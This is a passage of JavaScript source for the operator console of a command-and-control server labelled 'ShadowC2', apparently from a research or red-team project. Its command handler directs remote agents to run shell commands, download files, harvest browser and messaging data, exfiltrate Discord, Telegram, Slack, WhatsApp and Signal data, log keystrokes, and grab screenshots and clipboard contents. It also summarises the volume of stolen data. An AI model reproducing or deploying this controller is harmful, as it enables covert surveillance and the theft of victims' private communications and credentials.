        console.log(`  Active agent: ${targetId}`);
      } else {
        console.log(`  Agent not found. Use 'agents' to list.`);
      }
      break;
    }

    case 'exec':
      sendCommand({ type: 'exec', command: parts.slice(1).join(' ') });
      break;

    case 'read':
      sendCommand({ type: 'read_file', path: parts.slice(1).join(' ') });
      break;

    case 'ls':
      sendCommand({ type: 'list_dir', path: parts.slice(1).join(' ') || '.' });
      break;

    case 'download':
    case 'dl':
      if (parts.length < 2) {
        console.log('  Usage: download <remote-path>');
        console.log('  Files saved to data volume');
      } else {
        sendCommand({ type: 'download_file', path: parts.slice(1).join(' ') });
      }
      break;

    case 'harvest':
      sendCommand({ type: 'harvest' });
      break;

    case 'harvest_browser':
    case 'harvest-browser':
      sendCommand({ type: 'harvest_browser' });
      break;

    case 'harvest_messaging':
    case 'harvest-messaging':
      sendCommand({ type: 'harvest_messaging' });
      break;

    case 'harvest_signal':
    case 'harvest-signal':
      sendCommand({ type: 'harvest_signal' });
      break;

    case 'harvest_all':
    case 'harvest-all':
      sendCommand({ type: 'harvest_all' });
      break;

    case 'exfil_discord':
    case 'exfil-discord':
      sendCommand({ type: 'exfil_discord' });
      break;

    case 'exfil_telegram':
    case 'exfil-telegram':
      sendCommand({ type: 'exfil_telegram' });
      break;

    case 'exfil_slack':
    case 'exfil-slack':
      sendCommand({ type: 'exfil_slack' });
      break;

    case 'exfil_whatsapp':
    case 'exfil-whatsapp':
      sendCommand({ type: 'exfil_whatsapp' });
      break;

    case 'exfil_signal':
    case 'exfil-signal':
      sendCommand({ type: 'exfil_signal' });
      break;

    case 'keylog_start':
    case 'keylog-start':
      sendCommand({ type: 'keylog_start', duration: parseInt(parts[1]) || 60 });
      break;

    case 'keylog_stop':
    case 'keylog-stop':
      sendCommand({ type: 'keylog_stop' });
      break;

    case 'screenshot':
      sendCommand({ type: 'screenshot' });
      break;

    case 'clipboard':
      sendCommand({ type: 'clipboard' });
      break;

    case 'exfil_stats':
    case 'exfil-stats': {
      const totalBytes = exfilLog.reduce((sum, e) => sum + e.size, 0);
      const byType = {};
      for (const entry of exfilLog) {
        byType[entry.type] = (byType[entry.type] || 0) + entry.size;
      }
      console.log(`\n  Exfiltration Stats:`);
      console.log(`    Total messages: ${exfilLog.length}`);
      console.log(`    Total data received: ${(totalBytes / 1024).toFixed(1)} KB`);
      console.log(`    By type:`);
      for (const [type, size] of Object.entries(byType)) {
        console.log(`      ${type}: ${(size / 1024).toFixed(1)} KB`);
      }
      if (exfilLog.length > 0) {
        const firstMsg = exfilLog[0].timestamp;
        const lastMsg = exfilLog[exfilLog.length - 1].timestamp;
        console.log(`    Time span: ${((lastMsg - firstMsg) / 1000).toFixed(1)}s`);
      }
      break;
    }

    case 'timeline': {
      const count = parseInt(parts[1]) || 20;
      const total = exfilLog.length;
      const shown = exfilLog.slice(-count);
      if (total > count) {
        console.log(`\n  Event Timeline (last ${count} of ${total}):`);
      } else {
        console.log(`\n  Event Timeline (${total} events):`);
      }
      for (const entry of shown) {
        const time = new Date(entry.timestamp).toISOString().split('T')[1].split('.')[0];
        console.log(`    ${time} | ${entry.type.padEnd(20)} | ${entry.size} bytes`);
      }
      break;
    }

    case 'kill':
      sendCommand({ type: 'kill' });
      break;

    case 'killall':
      for (const [id, agent] of agents) {
        if (agent.ws && agent.ws.readyState === WebSocket.OPEN) {
          try {
            agent.ws.send(JSON.stringify({ type: 'kill' }));
            console.log(`  Kill sent to ${id}`);
          } catch (e) {
            console.log(`  Failed to send kill to ${id}: ${e.message}`);
          }
        }
      }
      break;

    case 'info':
      if (activeAgent && agents.has(activeAgent)) {
        console.log(JSON.stringify(agents.get(activeAgent).info, null, 2));
      } else {
        console.log('  No active agent');
      }
      break;

    case 'data': {
      const dataPath = parts.slice(1).join(' ') || '.';
      const fullPath = path.resolve(logsDir, dataPath);
      // Prevent directory traversal outside data dir
      if (!fullPath.startsWith(path.resolve(logsDir))) {
        console.log('  Error: path outside data directory');
        break;
      }
      try {
        if (!fs.existsSync(fullPath)) {
          console.log(`  Not found: ${dataPath}`);
          break;
        }
        const stat = fs.statSync(fullPath);
        if (stat.isDirectory()) {
          const entries = fs.readdirSync(fullPath, { withFileTypes: true });
          if (entries.length === 0) {
            console.log('  (empty directory)');
            break;
          }
          const relBase = path.relative(logsDir, fullPath) || '/';
          console.log(`\n  📁 ${relBase}`);
          console.log('  ' + '─'.repeat(58));
          for (const entry of entries) {
            const entryPath = path.join(fullPath, entry.name);
            const entryStat = fs.statSync(entryPath);
            const size = entryStat.isDirectory() ? '<DIR>' : formatBytes(entryStat.size);
            const modified = entryStat.mtime.toISOString().replace('T', ' ').substring(0, 19);
            const icon = entry.isDirectory() ? '📁' : getFileIcon(entry.name);
            console.log(`  ${icon} ${entry.name.padEnd(35)} ${size.padStart(10)}  ${modified}`);
          }
          console.log('  ' + '─'.repeat(58));
          console.log(`  ${entries.length} item(s)`);
        } else {
          console.log(`  File: ${dataPath} (${formatBytes(stat.size)})`);
          console.log('  Use "cat <path>" to view contents');
        }
      } catch (e) {
        console.log(`  Error: ${e.message}`);
      }
      break;
    }

    case 'cat': {
      const catPath = parts.slice(1).join(' ');
      if (!catPath) {
        console.log('  Usage: cat <path>');
        break;
      }
      const fullCatPath = path.resolve(logsDir, catPath);
      if (!fullCatPath.startsWith(path.resolve(logsDir))) {
        console.log('  Error: path outside data directory');
        break;
      }
      try {
        if (!fs.existsSync(fullCatPath)) {
          console.log(`  Not found: ${catPath}`);
          break;
        }
        const stat = fs.statSync(fullCatPath);
        if (stat.isDirectory()) {
          console.log('  That\'s a directory. Use "data <path>" to list it.');
          break;
        }
        const ext = path.extname(fullCatPath).toLowerCase();
        const isBinary = ['.png', '.jpg', '.jpeg', '.gif', '.db', '.sqlite', '.exe', '.dll', '.zip'].includes(ext);
        if (isBinary) {
          console.log(`  Binary file: ${catPath} (${formatBytes(stat.size)})`);
          console.log(`  Use filebrowser (port 8880) to download binary files`);
          break;
        }
        const maxSize = 100 * 1024; // 100KB limit
        if (stat.size > maxSize) {
          console.log(`  File too large (${formatBytes(stat.size)}). Showing first 100KB:\n`);
        }
        const content = fs.readFileSync(fullCatPath, 'utf-8').substring(0, maxSize);
        console.log('  ' + '─'.repeat(58));
        // For JSONL files, pretty-print each line
        if (ext === '.jsonl') {
          for (const line of content.split('\n').filter(l => l.trim())) {
            try {
              const obj = JSON.parse(line);
              console.log(JSON.stringify(obj, null, 2));
            } catch {
              console.log(line);
            }
          }
        } else {
          console.log(content);
        }
        console.log('  ' + '─'.repeat(58));
        console.log(`  ${formatBytes(stat.size)} total`);
      } catch (e) {
        console.log(`  Error: ${e.message}`);
      }
      break;
    }

    case 'data-size': {
      try {
        let totalSize = 0;
        let fileCount = 0;
        const dirSizes = {};

        function walkDir(dir, label) {
          if (!fs.existsSync(dir)) return;
          for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
            const entryPath = path.join(dir, entry.name);
            if (entry.isDirectory()) {
              walkDir(entryPath, label || entry.name);
            } else {
              const size = fs.statSync(entryPath).size;
              totalSize += size;
              fileCount++;
              const key = label || '(root)';
              dirSizes[key] = (dirSizes[key] || 0) + size;
            }
          }
        }
        walkDir(logsDir, '');
        console.log('\n  Exfil Data Summary');
        console.log('  ' + '─'.repeat(40));
        for (const [dir, size] of Object.entries(dirSizes).sort((a, b) => b[1] - a[1])) {
          console.log(`  ${(dir || '(root)').padEnd(25)} ${formatBytes(size).padStart(12)}`);
        }
        console.log('  ' + '─'.repeat(40));
        console.log(`  Total: ${formatBytes(totalSize)} in ${fileCount} file(s)`);
      } catch (e) {
        console.log(`  Error: ${e.message}`);
      }
      break;
    }

    case 'token':
      console.log(`  Auth token: ${AUTH_TOKEN}`);
      break;

    case 'quit':
      console.log('  Shutting down...');
      process.exit(0);

    default:
      if (input) console.log(`  Unknown command: ${command}`);
  }

  rl.prompt();
});

// -- Start plain server, then show banner --
plainServer.listen(PLAIN_PORT, '0.0.0.0', () => {
  console.log(`\n${RESEARCH_MARKER} ShadowC2 Server`);
  console.log(`  Plain WS listening on port ${PLAIN_PORT}`);
  console.log(`  Auth token: ${AUTH_TOKEN}`);
  console.log(`  (Agents must include this token in their beacon to connect)\n`);
  rl.prompt();
});
